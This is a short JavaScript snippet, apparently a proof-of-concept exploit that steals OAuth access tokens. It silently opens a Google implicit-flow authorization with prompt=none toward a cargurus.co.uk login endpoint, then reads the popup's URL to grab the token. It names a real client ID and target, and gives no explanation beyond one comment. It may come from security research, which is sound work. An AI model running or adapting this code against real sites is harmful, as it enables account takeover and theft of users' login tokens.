let exploitWindow = window.open(
    "https://accounts.google.com/o/oauth2/v2/auth?client_id=396192454224-vm2jk77e46pfa69esi2q6h61vitaiudn.apps.googleusercontent.com&redirect_uri=https://auth.cargurus.co.uk/auth/realms/cargurus/broker/google/endpoint&state=a&response_type=token&scope=openid&prompt=none",
    "a",
    "width=600,height=400,status=yes,scrollbars=yes,resizable=yes"
);

// Obtain access_token - access to exploitWindow.window.location is only possible from same origin of window
setTimeout(function(){
    alert(exploitWindow.window.location);
    exploitWindow.close();
},2000);
